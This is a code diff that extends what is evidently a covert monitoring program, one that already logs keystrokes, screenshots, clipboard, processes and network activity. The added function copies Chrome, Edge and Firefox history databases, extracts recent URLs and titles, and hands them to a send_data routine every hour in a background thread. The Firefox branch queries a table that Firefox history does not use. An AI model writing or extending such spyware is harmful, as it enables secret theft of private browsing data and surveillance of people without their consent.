@@ -13,7 +13,7 @@ import json
 import base64
 import sys
 import shutil
-from datetime import datetime
+from datetime import datetime, timedelta
 from pynput import keyboard
 from mss import mss
 from cryptography.fernet import Fernet
@@ -159,6 +159,59 @@ def log_network_activity():
             pass
         time.sleep(60) # Log every 60 seconds
 
+import sqlite3
+
+def log_browser_history():
+    browsers = {
+        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "History"),
+        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
+        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "History"),
+    }
+
+    while True:
+        history_data = []
+        for browser_name, history_path in browsers.items():
+            try:
+                if browser_name == "Firefox":
+                    # Find Firefox profile directory
+                    for root, dirs, files in os.walk(history_path):
+                        for file in files:
+                            if file == "places.sqlite":
+                                history_path = os.path.join(root, file)
+                                break
+                        if history_path.endswith("places.sqlite"):
+                            break
+                    else:
+                        continue # No Firefox history found
+
+                temp_history_path = os.path.join(os.getenv("TEMP"), f"{browser_name}_History.sqlite")
+                shutil.copyfile(history_path, temp_history_path)
+
+                conn = sqlite3.connect(temp_history_path)
+                cursor = conn.cursor()
+                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
+                
+                for row in cursor.fetchall():
+                    history_data.append({
+                        "browser": browser_name,
+                        "url": row[0],
+                        "title": row[1],
+                        "timestamp": datetime(1601, 1, 1) + timedelta(microseconds=row[2]) # Convert Chrome/Edge timestamp
+                    })
+                conn.close()
+                os.remove(temp_history_path)
+            except Exception as e:
+                pass
+        
+        if history_data:
+            send_data({
+                'type': 'browser_history',
+                'timestamp': datetime.now().strftime("%Y%m%d_%H%M%S"),
+                'history': history_data,
+            })
+        time.sleep(3600) # Log every hour
+
+
 
 def get_active_window_info():
     try:
@@ -266,6 +319,7 @@ if __name__ == "__main__":
     threading.Thread(target=log_clipboard, daemon=True).start()
     threading.Thread(target=log_processes, daemon=True).start()
     threading.Thread(target=log_network_activity, daemon=True).start()
+    threading.Thread(target=log_browser_history, daemon=True).start()
 
     with keyboard.Listener(on_press=log_keystroke) as listener:
         listener.join()
